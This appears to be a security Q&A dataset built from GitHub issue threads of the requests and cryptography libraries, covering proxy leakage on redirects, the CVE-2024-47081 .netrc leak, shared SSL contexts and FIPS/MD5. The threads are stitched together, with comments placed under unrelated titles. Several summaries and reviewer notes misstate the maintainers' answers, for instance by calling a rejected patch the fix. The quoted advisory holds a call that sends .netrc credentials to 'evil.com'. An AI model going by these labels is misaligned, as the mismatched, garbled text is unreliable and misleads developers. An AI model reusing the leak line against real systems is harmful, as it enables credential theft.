title: `http_proxy` bug with `starlette.responses.RedirectResponse`
security_topic: proxy leakage on HTTP redirects
qa_summary: The developer needed to know how to stop proxy information leaking on redirects (i.e., disable use of environment proxies for redirected requests), and the answer provides a concrete fix anchored at the resolve_proxies call in sessions.py line 316 (see the linked source line).

comments.author: wzh1994
comments.body:
<!-- Summary. -->

When using requests with the http_proxy environment variable set, and explicitly passing `proxies={'http': None, 'https': None}` to bypass the proxy, the first request correctly avoids using the proxy. However, if the request returns a redirect (e.g. 3xx), the redirected request incorrectly picks up the proxy settings from the environment, causing the request to fail.

<!-- What you expected. -->

When passing `proxies={'http': None, 'https': None}` to a request, both the original and any redirected requests should bypass the `proxy` and not use the `http_proxy` environment variable.

<!-- What happened instead. -->

Only the original request respects the `proxies={'http': None, 'https': None}` setting. The redirected request ignores it and uses the proxy from the environment variable, leading to connection errors if the target is not proxy-accessible.

## Reproduction Steps

```python
import os
import requests

# Set environment variable proxy (simulating a typical corporate environment)
os.environ['http_proxy'] = 'http://some.invalid.proxy:8080'

# Target URL that redirects to another domain
url = "http://httpbin.org/redirect-to?url=http://example.com"

# Explicitly disable proxy
resp = requests.get(url, proxies={'http': None, 'https': None})
print(resp.status_code)
```

# Suggested Fix
In [sessions.py line 316](https://github.com/psf/requests/blob/main/src/requests/sessions.py#L316):

`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env)`
should be updated to:
`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env if proxies is None else False)`

This ensures that when proxies is explicitly passed in by the user (even as None), environment proxies are not used for redirects.

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->

comments.author: wzh1994
comments.body:
For the time being, I solved the issue by manually setting the `trust_env` attribute of the `Session` object to `False` in the modified `request` function.

Refer： https://github.com/LazyAGI/LazyLLM/pull/548/files#diff-b02a502a018fbdf49a0af37c6f8c2e971bbd850f4cad1ca6cca54da63cf1ca1cR26

comments.author: nateprewitt
comments.body:
Hi @wzh1994,

I think this is working as intended. While you can disable proxies for the request, any redirects move us outside of the explicitly declared intent of the call. That may lead to unintentional leaking of information to other parties like we see with your example.com redirect. If you want to fully disable use of the system defined proxies, you have a few options:

1.) Create a Session with `trust_env` disabled. You're explicitly disabling use of the system defined proxies for all requests and can freely handle traffic that shouldn't use the proxy. If you have separate requests that need the proxy, you can create a second Session to handle those.

2.) Disable auto-redirects. You can set `allow_redirects=False` and handle each call as needed. This enables you to make decisions on subsequent proxy usage.

3.) If you have specific domains you want to avoid proxy usage, you should be able to set `no_proxy` which will omit those from proxy usage.

The proposed change is not the correct semantics. A magic value that disables or enables use of environment content that doesn't respect defined values for `trust_env` is a security issue waiting to happen. We're defaulting to the secure decision here and I think we'll keep that for now. The settings above allow for the workflow you're needing and would be our advised options.

human_note: Accepted because the question involves a security-relevant proxy leakage scenario and the answer provides correct, documented mitigation strategies grounded in Requests session proxy handling.

comments.author: sigmavirus24
comments.body:
@Ten0 I commented here but was referring to the PR created for this issue issue created by an LLM user where it checks for a single-certificate in the trust bundle.

> It seems instead to do the reasonable thing which is, just trust the intermediate cert as if it was a self-signed cert? (I'm not sure what you mean.)

This is not how trust chains work. When a server and client are establishing a TLS connection, the server (to ensure that every client might work) _must_ provide:

* it's leaf
* the issuer of that leaf
* any and all intermediates leading to the root

So if you have a architecture that looks like `Root CA -> Intermediate -> Issuer -> Leaf` `Intermediate`, `Issuer`, and `Leaf` [must all be provided by the server](https://github.com/curl/curl/discussions/14009#discussioncomment-9869251). Web browsers can do something called AIA fetching to find missing links in the chain but most non-web-browser clients do not do that, and `openssl` does not give a good way to do this. That means that all that _needs_ to be in the trust store is the Root, not an intermediate. An intermediate is signed by something else, and if we don't trust what signed it, we cannot trust it. That's why trust stores are also called Root Stores.

> > but it isn't something we should be setting by default
> 
> As far as I'm concerned that seems pretty reasonable:

Do you mean us not setting partial chain by default is reasonable?

> I don't see what else one could one possibly mean by adding an intermediate cert to the trust store. 

People do things like this without actually understanding why often times. Sometimes because they found it on a random website or because a statistical model tells them to based off some other website it was fed as part of its training data.

> That is indeed [what curl does](https://github.com/curl/curl/blob/150567b0d25b519873800ac883ae43833e8f6aca/lib/vtls/openssl.c#L3461-L3469), and that opens more room for people to specify certs instead of having to disable certs verification (which is what [I ended up having to do on the software that prompted me to open this issue](https://github.com/Ten0/livebox-python-api/blob/4f62dd5f6ed2a88378e21e814a0af67b0cdc9e42/livebox_api.py#L17-L27)).

curl has specific flags to enable and control this behaviour. We do not have that kind of API surface area. The best way for us to enable this would be for us to accept an SSLContext or something that generates them. Thta isn't something we hvae a good way to add though, especially given our feature-freeze.

Disclaimer: Of course I am no particular authority on this, I'm just weighing in an opinion as a user with reasonable knowledge of PKIs and security in general, adding to that limited weight that of whoever is responsible for that kind of choice over at curl, to the extent that it can also be considered relevant here.

> This is not how trust chains work

Thank you for your time on this explanation. I knew already though: my original message specifies as example a case where server's behavior constitutes a "mistake" that would require "fixing".

I mean that it sounds reasonable to me (and apparently to the curl people as well), security-wise, to have the same [default](https://github.com/curl/curl/blob/92a212568403d985a2614a7d206bf34b7a8fb827/docs/libcurl/opts/CURLOPT_PROXY_SSL_OPTIONS.md?plain=1#L54-L60) behavior as curl, that is, if people explicitly ask to trust an intermediate, and the leaf has a valid chain leading up to that indermediate, we don't require to also trust the root and have a valid chain leading up to that root, because I do not see what else specifying an intermediate certificate as trusted could possibly mean, considering that as you said, root is otherwise both required and sufficient.

> or because a statistical model tells them to

Even if they did trust an intermediate instead of the root when they trusting the root would have been more appropriate for their use-case, AFAICT that is not a security concern.

I don't see how that would *cause* security issues, and at least I know that [it would *fix mine*](https://github.com/Ten0/livebox-python-api/blob/4f62dd5f6ed2a88378e21e814a0af67b0cdc9e42/livebox_api.py#L17-L27), and I'm not saying this because an LLM told me so. 😅

In fact, I think that the least things are going to easily work, the more people who don't understand are going to just disable cert verification, which in turn looks like a more likely security issue than any one that would be caused by enabling this option by default.

It looks like this might also allow use-cases where one could trust less than the root, only a sub-portion of signatories, for a particular application, which could also possibly be more secure than being forced to trust the whole root which would then become a problem if *any* intermediate leaked.

comments.body:
In case of a chain `CA` -> `Leaf cert` where CA is unavailable next code works fine:
```py
import requests
import ssl
import urllib3


class CustomSslAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, ssl_context=None, **kwargs):
        self.ssl_context = ssl_context
        super().__init__(**kwargs)
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = urllib3.poolmanager.PoolManager(
            num_pools=connections,
            maxsize=maxsize,
            block=block,
            ssl_context=self.ssl_context
        )


my_leaf_certs = ['cert.crt']

context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.verify_flags |= ssl.VERIFY_X509_PARTIAL_CHAIN
for leaf_cert in my_leaf_certs:
    context.load_verify_locations(leaf_cert)

session = requests.Session()
session.mount('https://', CustomSslAdapter(ssl_context=context))

response = session.get('https://host:port')
print(response.status_code)
```

With deco implementation:
```py
def verify_x509_partial_chain(my_leaf_certs, ssl_context=None):
    def deco(get_session_func):
        def deco2():
            session = get_session_func()
            context = ssl_context or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.verify_flags |= ssl.VERIFY_X509_PARTIAL_CHAIN
            print(context.verify_flags)
            for leaf_cert in my_leaf_certs:
                context.load_verify_locations(leaf_cert)
            session.mount('https://', CustomSslAdapter(ssl_context=context))
            return session
        return deco2
    return deco

@verify_x509_partial_chain(my_leaf_certs=['cert.crt'])
def get_session():
    return requests.Session()


session = get_session()
response = session.get('https://host:port')
print(response.status_code)
```

With context manager implementation:
```py
from contextlib import contextmanager

@contextmanager
def verify_x509_partial_chain(my_leaf_certs, ssl_context=None):
    context = ssl_context or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.verify_flags |= ssl.VERIFY_X509_PARTIAL_CHAIN
    for leaf_cert in my_leaf_certs:
        context.load_verify_locations(leaf_cert)
    session = requests.Session()
    session.mount('https://', CustomSslAdapter(ssl_context=context))
    try:
        yield session
    finally:
        pass

with verify_x509_partial_chain(my_leaf_certs=['cert.crt']) as session:
    response = session.get('https://host:port')
    print(response.status_code)
```

title: CVE-2024-47081: Netrc credential leak in PSF requests library
security_topic: availability of fix for netrc credential leak CVE
qa_summary: The developer needed to know if CVE-2024-47081 (netrc credential leak) is fixed, and the answer confirms it is addressed in requests 2.32.4 with advisory GHSA-9hjg-9r4m-mvj7.

comments.author: corneliusroemer
comments.body:
There does not yet seem to be an issue nor an advisory about CVE-2024-47081 which was recently disclosed on seclists.org - I'm thus copying the advisory here:

```
From: Juho Forsén via Fulldisclosure <fulldisclosure () seclists org>
Date: Sat, 31 May 2025 06:30:50 +0000
The PSF requests library (https://github.com/psf/requests & https://pypi.org/project/requests/) leaks .netrc 
credentials to third parties due to incorrect URL processing under specific conditions.

Issuing the following API call triggers the vulnerability:

  requests.get('[http://example.com:@evil.com/&apos](http://example.com@evil.com/&apos);)

Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.

The root cause is 
https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245

The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available. 
CVE-2024-47081 has been reserved by GitHub for this issue.

As a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.
```
Link: https://seclists.org/fulldisclosure/2025/Jun/2

Seems like I found the problem after starting to reconstruct the request. It's _odly specific_. 

When I supress the warnings from urllib3, I get the issue:

```python
import urllib3

urllib3.disable_warnings()
```

If I remove the warning suppression, the script works as expected.

It's also conditioned to doing a POST request with `data` or `json`, and receiving back an specific header.

But weirdly I also only get the issue when doing a post request (I also have tried multiple combinations using httpbin).

At first, this seemed similar to https://github.com/python/cpython/issues/102547, but upgrading to Python 3.14.3 did not do the trick for me, which leads me to believe the issue is somewhere on the urllib3 library.

comments.author: nateprewitt
comments.body:
Without a repro, or  very specific environment information, it's hard to say what's going on here. It's almost certainly somewhere below Requests, and I'd wager below urllib3. The fact it varies based on CPython version _and_ it's Windows gives the impression it's an interop issue between CPython and the version of OpenSSL the  installation is built with.

3.12-3.14 should all be built against OpenSSL 3.0.x with the installers. That would probably be the first thing to check between environments. I'm not sure we're going to be a ton of help in this case though.

We are getting [the same error message in Arch Linux](https://gitlab.archlinux.org/archlinux/infrastructure/-/issues/688) for a `*.tw` domain, so I did a bit of digging.

The issue boils down to `VERIFY_X509_STRICT` and `VERIFY_X509_PARTIAL_CHAIN` being set (https://github.com/python/cpython/issues/107361, https://github.com/urllib3/urllib3/issues/3571). So I assume this is just working as designed? For testing purposes the website of TWCA (`https://www.twca.com.tw/`) can be used.

comments.author: nateprewitt
comments.body:
It turns out this is actually a [change](https://github.com/python/cpython/pull/26330) in Python 3.11. The netrc update is in the docs but missed the release notes. For 3.11+, it treats a netrc entry without username, account or password as valid. That means a file can have a valid `default` profile that we shouldn't be using.

What's happening in Requests is we used to get a `NetrcParseError` that defaulted the value to `None` skipping this. Now, that produces `('', '', '')` for our `_netrc`. That tuple is in turn "truthy" and used to create an `Authorization` header with two empty values (`:`).

I've made a [PR](https://github.com/psf/requests/pull/7205) that skips using the netrc entries entirely if we can't find any info. I'd argue what we're doing now is wrong. If someone _really_ wants to include `:` as their Authorization header value, they can do it through `auth=('', '')`. Grabbing random entries that aren't intended for use should skipped.

Once that's merged, this should be fixed in the next release. Thanks for the report @yermulnik!

human_note: Accepted because the issue is a credential-handling regression and the answer correctly traces the root cause and points to an upstream fix with a concrete patch.

comments.author: saksham-sak
comments.body:
Ensure that each thread creates and uses its own ssl_context rather than sharing a global one. This isolates SSL configurations and avoids concurrency issues.
 Use requests' Session object and configure a unique SSL context per session.
import requests
from urllib3.util.ssl_ import create_urllib3_context

def do_request():
    session = requests.Session()
    session.mount("https://", requests.adapters.HTTPAdapter(
        pool_connections=1, pool_maxsize=1, ssl_context=create_urllib3_context()
    ))

    cert = ('./client.crt', './client.key')
    response = session.get("https://httpbin.org/anything", cert=cert)
    print(response.status_code)
 Avoids race conditions by isolating SSL contexts.
Slightly increases memory usage due to creating multiple SSL contexts.

Could I work on this ticket ?

comments.body: that seems ok for me. We use already python 3.10/3.11 in our environment and i believe most cases also

comments.author: SeJunB
comments.body:
After giving this a thought, I am hesitant on adding the `usedforsecurity` attribute to MD5 in the HTTPDigestAuth class for the following reasons:

1. Security Documentation Conflict
- The [hashlib](https://docs.python.org/3/library/hashlib.html) documentation explicitly states that `usedforsecurity` should only be used in non-security contexts. Adding this attribute to HTTPDigestAuth would directly contradict this guidance.
- [RFC 7616](https://datatracker.ietf.org/doc/html/rfc7616#section-6.1) does not recommend MD5 as a secure hashing algorithm for digest authentication.

2. FIPS Compliance and Compatibility Risks
- Setting `usedforsecurity=False` could inadvertently enable MD5-based HTTPDigestAuthentication in environments and could cause trouble for any users using `requests` in a FIPS environment.

Recommendation:
- Close this issue
- For teams requiring this specific configuration, recommend forking and maintaining a custom patched version
- Encourage migration to more secure hashing algorithms (e.g., SHA)

In my experience working with customers requiring FIPS compliance, they typically prefer upgrading to more secure authentication methods rather than maintaining legacy MD5-based approaches.

comments.author: RossComputerGuy
comments.body: I get errors running the tests with FIPS enabled. Maybe it would be good to automatically skip the tests which depend on md5.

comments.author: nateprewitt
comments.body:
I'm not sure we're framing the security concerns correctly. The hashing algorithm is explicitly _not_ a security mechanism, it's a detail of the protocol. The RFC [calls this out](https://datatracker.ietf.org/doc/html/rfc7616#section-5.1) as a limitation. Whether a server chooses MD5 or SHA256, doesn't meaningfully change the risk profile for intercepted requests.

> HTTP Digest Authentication, when used with human-memorable passwords,
   is vulnerable to dictionary attacks.  Such attacks are much easier
   than cryptographic attacks on any widely used algorithm, including
   those that are no longer considered secure.  **In other words,
   algorithm agility does not make this usage any more secure.**

The security control here is a high entropy password + TLS + using Digest auth with trusted servers. The server chooses the algorithm used, not Requests. The algorithm choice is a constant time multiplier, not an algorithmic complexity change for brute-forcing. Adding a single character to your password provides more brute-force resistance than the algorithm choice.

I've opened https://github.com/psf/requests/pull/7310 to address this. We'll leave it out of today's release to give some time for comment.

human_note: Accepted because the question is a valid FIPS/MD5 compatibility issue and the answer correctly provides the standard usedforsecurity=False workaround used to restore HTTP Digest Auth functionality under FIPS constraints.

title: Deprecated `HTTPAdapter.get_connection()` method is never called, causing breakage without deprecation warnings
security_topic: breaking change due to security fix for CVE-2024-35195
qa_summary: The developer needed to know that the breakage was caused by the security fix for CVE-2024-35195 and that the backward-compatible workaround is provided in PR #6710.

comments.author: wgreenberg
comments.body:
After upgrading several of certbot's packages, including `requests` to 2.32.3, we suddenly started experiencing confusing DNS resolution errors with no clear cause. Only after bisecting the changed packages and isolating `requests` as the source of the trouble did we see that 2.32.2 deprecated the `HTTPAdapter.get_connection()` method we used.

Unfortunately, the change which deprecated `get_connection()` also causes it never to be called by `Session`, so the `DeprecationWarning` added in https://github.com/psf/requests/pull/6710 will never be printed. If `Session` perhaps checked if `get_connection()` was defined and called it, the warning would've printed and would've saved us quite a lot of time tracking down the issue.

I also generally wouldn't expect a minor version upgrade in a dependency to cause a breaking change, so this result was extra confusing.

## Expected Result

`HTTPAdapter.get_connection()` to still be called, resulting in no breaking changes and giving users the deprecation warning. Or at the very least, check if `get_connection` is defined and print the deprecation warning then.

## Actual Result

`HTTPAdapter.get_connection()` is silently left uncalled, causing a breakage.

comments.author: nateprewitt
comments.body:
Hi @wgreenberg, the commit you linked appears to be part way through the issue. #6710 was to provide a public API for users who were overriding `get_connection`. The initial breakage came from #6655 to address CVE-2024-35195.

While we don't generally make breaking changes in minor patch versions, users were unknowingly exposing data over unverified connections. We chose to patch the API but it appears docker and certbot are two cases that were negatively impacted.

There were a few misses in messaging around this change because impact wasn't assessed completely prior to releasing 2.32.0. The workaround provided in #6710 will be the backwards compatible middle ground to keep adapters using a custom `get_connection` working with the least amount of work going forward.

title: Multiple concurrent client certs broken with v2.32.3
security_topic: client certificate leakage due to shared SSL context in concurrent requests
qa_summary: The problem stems from the shared SSL context being mutated during concurrent client‑certificate requests, and the fix is provided in commit fe251aa94b2b7849e224e455c0aad0df53ad3d8e which disables the default context when certs are present.

Additionally, we make use of `ThreadPoolExecutor` to make many requests in parallel.
When client certs are in use, urllib3 will [load the cert into the SSL context](https://github.com/urllib3/urllib3/blob/b07a669bd970d69847801148286b726f0570b625/src/urllib3/util/ssl_.py#L454-L458), which, with concurrent requests, will cause the shared SSL context to get modified while it's in use.

The reproducer actually fails with an exception - when we first encountered this, we were seeing the wrong certs get used. (That was with different versions of python and openssl, however, and as mentioned above, they're all signed by the same CA, unlike the reproducer)

We got hit by this bug, it can happen  in non-concurrent code. Once a client certificate has been passed, it keeps being used in subsequent calls. Possibly in totally unrelated code and libraries.

```python

res_2 = requests.post(url_2, json=data)  # <-- subsequent calls keep using `cert` 
```

My guess is a global state being mutated in the library. It might be related to this line in the 2.32.0 changelog, but we did not investigate further.

> * verify=True now reuses a global SSLContext which should improve request time variance between first and subsequent requests.

comments.author: blueflyingpanda
comments.body:
> We got hit by this bug, it can happen in non-concurrent code. Once a client certificate has been passed, it keeps being used in subsequent calls. Possibly in totally unrelated code and libraries.
> 
> res_1 = requests.post(url_1, json=data, cert=cert)
> res_2 = requests.post(url_2, json=data)  # <-- subsequent calls keep using `cert` 
> My guess is a global state being mutated in the library. It might be related to this line in the 2.32.0 changelog, but we did not investigate further.
> 
> > * verify=True now reuses a global SSLContext which should improve request time variance between first and subsequent requests.
> 
> Rolling back to `requests-2.31.0` fixes it for now.
> 
> Thank you for your work!

I've encountered this bug as well. Here’s what I’ve discovered so far:

In `requests-2.31.0`, `SSLContext` was created dynamically:
[urllib3/connection.py#L755-L765](https://github.com/urllib3/urllib3/blob/b07a669bd970d69847801148286b726f0570b625/src/urllib3/connection.py#L755C5-L765)

However, in `requests-2.32.3`, `_preloaded_ssl_context` is used instead:
- `_preloaded_ssl_context` creation: [requests/adapters.py#L80](https://github.com/psf/requests/blob/1b7c37ef4e3db003cc52f09da9ab6b947054e245/src/requests/adapters.py#L80)
- Applied conditionally: [requests/adapters.py#L114](https://github.com/psf/requests/blob/1b7c37ef4e3db003cc52f09da9ab6b947054e245/src/requests/adapters.py#L114)

The key issue is that once a client certificate is loaded into `_preloaded_ssl_context`, it persists for all subsequent requests—even if no certificate is provided. This appears to be an unintended side effect of global state reuse.

To work around this, I implemented a custom `HTTPAdapter`:

### Option 1: Override `get_connection_with_tls_context`
This prevents unwanted certificate reuse but relies on a deprecated method:
```python
class CustomHTTPAdapter(HTTPAdapter):

    def get_connection_with_tls_context(self, request, verify, proxies=None, cert=None):
        # keep in mind .get_connection() is now deprecated
        return self.get_connection(request.url, proxies)
```

### Option 2: Reset SSLContext
This explicitly resets the SSLContext to avoid persistent client certificates:
```python
class CustomHTTPAdapter(HTTPAdapter):

    @staticmethod
    def _get_reset_ssl_context() -> ssl.SSLContext:
        # Create a fresh SSLContext and load CA certificates
        ssl_context = create_urllib3_context()
        ssl_context.load_verify_locations(
            extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)
        )
        return ssl_context

    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = self._get_reset_ssl_context()
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs['ssl_context'] = self._get_reset_ssl_context()
        return super().proxy_manager_for(*args, **kwargs)
```

title: SSLCertVerificationError - unable to get local issuer certificate
security_topic: using load_default_certs with requests 2.32.x SSLContext changes
qa_summary: The developer needed the proper method to load default system CA certificates in Requests 2.32.x, and the answer provides a concrete code solution using a custom SSLContext in the adapter, citing the Requests adapters source (adapters.py line 95‑96) and the related PR #6716.

comments.author: DanSIntel
comments.body:
Version **2.32.0** introduced changes and improvements with **SSLContext** as specified in the release history:

Improvements - verify=True now reuses a global SSLContext which should improve request time variance between first and subsequent requests. It should also minimize certificate load time on Windows systems when using a Python version built with OpenSSL 3.x. (#6667)


We are facing issue making http requests to webservers which are signed by a local root ca.
The certificate chain is installed correctly on the Windows station and **version 2.31.1 is working as expected**.

Versions **2.32.x** are throwing an error:  SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1125)')))



This is a code example that works in 2.31.1 and does not in 2.32.x


```
from requests.adapters import HTTPAdapter
import requests
from requests.packages.urllib3.util.ssl_ import create_urllib3_context

class SSLContextAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = create_urllib3_context()
        context.load_default_certs()  # this loads the system's CA certificates
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)

SESSION = requests.Session()
SESSION.mount('https://', SSLContextAdapter())
SESSION.get(MY_URL_SIGNED_BY_LOCAL_ROOT_CA, headers = headers, verify  = True)
```



After looking at the lastest changes, if we modifiy our code its working but i dont think that calling the private global **_preloaded_ssl_context** is the right way:

```
from requests.adapters import HTTPAdapter, _preloaded_ssl_context
import requests


class SSLContextAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        _preloaded_ssl_context.load_default_certs() # this loads the system's CA certificates
        return super().init_poolmanager(*args, **kwargs)

SESSION = requests.Session()
SESSION.mount('https://', SSLContextAdapter())
SESSION.get(MY_URL_SIGNED_BY_LOCAL_ROOT_CA, headers = headers, verify  = True)
```


What is the recommended way for using load_default_certs() with version 2.32.x if the usage has changed or alternatively can you confirm if this is a bug?

I'd propose we close this as a duplicate of #6715 if the above is agreeable and we'll track progress in the PR.

title: Tracking: Post-quantum cryptography (ML-KEM / ML-DSA / SLH-DSA) support roadmap
security_topic: roadmap for post-quantum cryptography support
qa_summary: The developer asked whether the library plans to add post‑quantum algorithms to mitigate quantum‑vulnerability, and the maintainer replied that the next release will include ML‑KEM and ML‑DSA support and referenced issue #14419 for SLH‑DSA.

comments.author: maddykws
comments.body:
Hey all,

First — I know this library *implements* RSA and ECC. That's the point. 
This isn't a "you have vulnerabilities" issue. It's more of a "where are 
we on PQC support and can I help" issue.

Context: I've been building a scanner (QuantumMigrate) that audits 
codebases for quantum-vulnerable crypto usage. I ran it on this repo 
mostly out of curiosity, and it flagged 174 usages in src/ alone — which 
is completely expected given what this library does. But it made me 
wonder about the roadmap for NIST PQC support.

NIST finalized three standards in 2024:
- ML-KEM (FIPS 203) — key encapsulation, replaces RSA/DH/ECDH
- ML-DSA (FIPS 204) — signatures, replaces RSA/ECDSA/DSA  
- SLH-DSA (FIPS 205) — hash-based signatures, conservative backup

The deadline pressure is real. "Harvest now, decrypt later" means 
encrypted data being sent over TLS today is potentially being stockpiled. 
The sensitive stuff — healthcare records, financial transactions, anything 
with a long confidentiality window — is already at risk.

A few specific things I noticed in the source that seem worth discussing:

**ssh.py (22 hits)** — RSA and ECC key types for SSH. OpenSSH already 
merged experimental support for ML-KEM-768 in OpenSSH 9.0. Is there a 
plan to surface that here once it stabilises in the spec?

**_oid.py (lines 128-148)** — SHA1 and MD5 in the OID signature 
algorithm map. I understand these exist for parsing legacy certs, but 
is there appetite for a deprecation warning when they're used for 
*signing* (not just parsing)?

**ec.py / rsa.py** — Core implementations obviously stay, but are there 
plans to add ML-KEM and ML-DSA alongside them? OpenSSL 3.5 shipped 
post-quantum support in March 2026. Since cryptography wraps OpenSSL, 
I'd imagine this is closer than it looks.

I'm not expecting you to rip out RSA tomorrow. I'm genuinely asking 
whether there's an existing tracking issue I missed, whether there's a 
preferred way to contribute PQC primitives if OpenSSL exposes them, or 
whether this is something the maintainers have already scoped.

Happy to help however makes sense — testing, docs, whatever.

Thanks for maintaining one of the most important libraries in the Python 
ecosystem.

— scanned with https://github.com/maddykws/QuantumMigrate

title: Accessing unrelated extensions fails when BasicConstraints encodes default `ca:FALSE`
security_topic: strict DER validation causing unrelated extension access failure
qa_summary: The developer needed to know whether the library should accept certificates that explicitly encode the default ca:FALSE in BasicConstraints, and the maintainer answered that invalid DER is intentionally rejected, citing a design statement (see https://alexgaynor.net/2025/mar/25/postels-law-and-the-three-ring-circus/).

comments.author: st3fan
comments.body:
# Accessing unrelated extensions fails when BasicConstraints encodes default `ca:FALSE`

## Versions

- Python: 3.13.5
- cryptography: 46.0.6
- OS: Debian Trixie (amd64)

## Description

When a certificate's `BasicConstraints` extension explicitly encodes `ca:FALSE` (the DER default value), the `cryptography` library raises a `ValueError` with `ParseError { kind: EncodedDefault }` when accessing **any** extension, not just `BasicConstraints`.

This means that calling `cert.extensions.get_extension_for_class(SubjectAlternativeName)` fails even though the SAN extension itself is perfectly valid. The error is thrown during iteration of the extensions list, making all extensions inaccessible.

The certificate is a real certificate observed in a Certificate Transparency log. OpenSSL parses it without errors and correctly shows `CA:FALSE` in the Basic Constraints and a valid SAN (`DNS:receptum-apteekkiverkko.maxx.fi, IP Address:83.150.105.126`).

While explicitly encoding the default value violates DER (the `ca` field defaults to `FALSE` per RFC 5280 and should be omitted), this encoding is common in the wild and is accepted by other implementations.

## Minimal PoC

```python
from cryptography import x509

der = open("entry_0046.der", "rb").read()
cert = x509.load_der_x509_certificate(der)

# This works fine:
print(cert.subject)
print(cert.issuer)

# This fails, even though SAN is valid:
san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
```

Output:

```
Traceback (most recent call last):
  File "poc.py", line 8, in <module>
    san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ...
ValueError: error parsing asn1 value: ParseError { kind: EncodedDefault, location: ["BasicConstraints::ca"] }
```

## OpenSSL output

OpenSSL parses the same certificate without issue:

```
$ openssl x509 -inform DER -in entry_0046.der -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            01:99:3d:78:70:fe:f2:ca:f0:9b:b6:c9:d1:78:28
        Signature Algorithm: sha512WithRSAEncryption
        Issuer: C=FI, O=Digi- ja vaestotietovirasto CA, OU=Sosiaali- ja terveydenhuollon palveluvarmenteet, CN=DVV Social Welfare and Healthcare Service Certificates - G3R
        Validity
            Not Before: Oct 22 21:00:00 2025 GMT
            Not After : Oct 22 20:59:59 2026 GMT
        Subject: C=FI, ST=FINLAND, L=Naantali, O=Naantalin 2. apteekki, serialNumber=1.2.246.553.1.853.13.0, CN=83.150.105.126
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Subject Alternative Name:
                DNS:receptum-apteekkiverkko.maxx.fi, IP Address:83.150.105.126
```

(Full output omitted for brevity. The certificate is attached as `entry_0046.pem.txt`.)

## Root cause

The BasicConstraints extension contains `30 03 01 01 00` — a SEQUENCE with an explicit `BOOLEAN FALSE`. Per DER, the `ca` field defaults to `FALSE` and must be omitted when it has the default value. The Rust ASN.1 parser in `cryptography` strictly rejects this as `EncodedDefault`. Since extension parsing is all-or-nothing, this makes every extension on the certificate inaccessible.

## Expected behavior

Ideally, accessing an unrelated extension like `SubjectAlternativeName` should not fail due to a strict-DER violation in `BasicConstraints`. Possible approaches:

1. Parse extensions lazily so that accessing one extension doesn't require successfully parsing all others.
2. Accept the common DER violation of explicitly encoding default values in `BasicConstraints`.

[entry_0046.pem.txt](https://github.com/user-attachments/files/26522833/entry_0046.pem.txt)

comments.author: alex
comments.body:
This is an intentional design behavior.

In reverse order: We do not accept invalid DER, except in exceedingly rare cases. (See https://alexgaynor.net/2025/mar/25/postels-law-and-the-three-ring-circus/)

As for the issue of unrelated extensions, the most recent time this was brought up was https://github.com/pyca/cryptography/issues/13504#issuecomment-3368256526 (but I'm reasonably certain there's been other issues about this)

comments.author: st3fan
comments.body: Thanks @alex - I think that is fair. Because this is so extremely rare (I parsed more than 100,000,000 certificates before this happened) I will use a fallback parser when this specific error happens. Thank you for the clear response.

comments.author: SillyZir
comments.body: The extension iterator likely validates all extensions collectively; `ParseError { kind: EncodedDefault }` from `BasicConstraints` bubbles up on any access. Consider treating `EncodedDefault` as a recoverable warning in the Rust extension parser rather than a hard error.

title: Fix for CVE-2026-26007 breaks ecc
security_topic: regression of CVE-2026-26007 fix breaking Ansible
qa_summary: The developer needed to know why the CVE-2026-26007 security fix broke Ansible's SECP384R1 support and that the issue is fixed in the ansible-collections/community.crypto commit 911ed33c2e898e6b56e640fa4f71afa599db3fcb.

comments.author: mdeslaur
comments.body:
Hi,

We have gotten a report that the fix for CVE-2026-26007 included in 46.0.5 is breaking Ansible.

Ansible now returns the following error:
fatal: [localhost]: FAILED! => changed=false
msg: Your cryptography version does not support SECP384R1

A simple reproducer for this issue is:
```
import cryptography.hazmat.primitives.asymmetric.ec
ecclass = cryptography.hazmat.primitives.asymmetric.ec.__dict__.get('SECP384R1')
print(ecclass)
```

Downstream bug report for possibly more information:
https://bugs.launchpad.net/ubuntu/+source/python-cryptography/+bug/2144373
(We had backported the security fix to our stable releases in Ubuntu, but the same issue is present in 46.0.5)

Thanks!

comments.author: alex
comments.body:
I assume this is an unexpeted consequene of our `deprecated` utility: https://github.com/pyca/cryptography/commit/0eebb9dbb6343d9bc1d91e5a2482ed4e054a6d8c#diff-42b5786fb7abc7aa972632f10f1a9e5e7fa2184943dda31d2671690d489c579cR461-R464

That said, accessing things via `__dict__` isn't really the correct way to get attributes from a module.

comments.author: mdeslaur
comments.body:
Yes, it appears to be caused by the deprecated utility.

Looks like the affected ansible code is [here](https://github.com/ansible-collections/community.crypto/blob/b1e4777b4d3a0fd4f74f2a9cc0075fdecb088d3f/plugins/module_utils/_crypto/module_backends/privatekey.py#L104)

comments.author: alex
comments.body: Oh, that's because it was fixed: https://github.com/ansible-collections/community.crypto/commit/911ed33c2e898e6b56e640fa4f71afa599db3fcb

comments.author: alex
